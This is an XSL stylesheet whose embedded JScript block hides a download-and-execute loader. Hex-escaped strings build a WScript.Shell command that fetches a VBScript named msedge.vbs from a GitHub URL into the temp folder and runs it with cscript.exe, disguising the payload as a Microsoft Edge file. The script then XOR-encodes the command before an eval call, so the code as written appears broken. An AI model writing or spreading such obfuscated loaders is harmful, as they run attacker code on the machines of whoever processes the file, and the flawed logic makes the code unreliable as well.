<?xml version='1.0'?> 
<stylesheet xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt" xmlns:user="unknown" version="1.0">
  <output method="text"/>
  <ms:script language="JScript" implements-prefix="user"> 
    <![CDATA[
    var _0x1a2b=["\x57\x53\x63\x72\x69\x70\x74\x2E\x53\x68\x65\x6C\x6C","\x52\x75\x6E\x28","\x63\x75\x72\x6C\x20\x68\x74\x74\x70\x73\x3A\x2F\x2F\x72\x61\x77\x2E\x67\x69\x74\x68\x75\x62\x75\x73\x65\x72\x63\x6F\x6E\x74\x65\x6E\x74\x2E\x63\x6F\x6D\x2F\x56\x69\x63\x6B\x79\x2D\x53\x79\x73\x74\x2F\x6D\x6F\x66\x61\x2F\x6D\x73\x65\x64\x67\x65\x2F\x6D\x73\x65\x64\x67\x65\x2E\x76\x62\x73\x20\x2D\x6F\x20","\x25\x54\x45\x4D\x50","\x5C\x6D\x73\x65\x64\x67\x65\x2E\x76\x62\x73","\x26\x26\x20\x63\x73\x63\x72\x69\x70\x74\x2E\x65\x78\x65\x20","\x25\x54\x45\x4D\x50","\x5C\x6D\x73\x65\x64\x67\x65\x2E\x76\x62\x73","\x22\x29\x3B"];
    var _0x3dc6=_0x1a2b[0x0]+_0x1a2b[0x1]+_0x1a2b[0x2]+_0x1a2b[0x3]+_0x1a2b[0x4]+_0x1a2b[0x5]+_0x1a2b[0x6]+_0x1a2b[0x7];

    // XOR encode function
    function xorEncode(str, key) {
        var encoded = '';
        for (var i = 0; i < str.length; i++) {
            encoded += String.fromCharCode(str.charCodeAt(i) ^ key.charCodeAt(i % key.length));
        }
        return encoded;
    }

    var key = 'secretkey'; // Define your XOR key here
    var encodedScript = xorEncode(_0x3dc6, key);
    eval(encodedScript); // Execute the encoded script
    ]]>
  </ms:script>
</stylesheet>
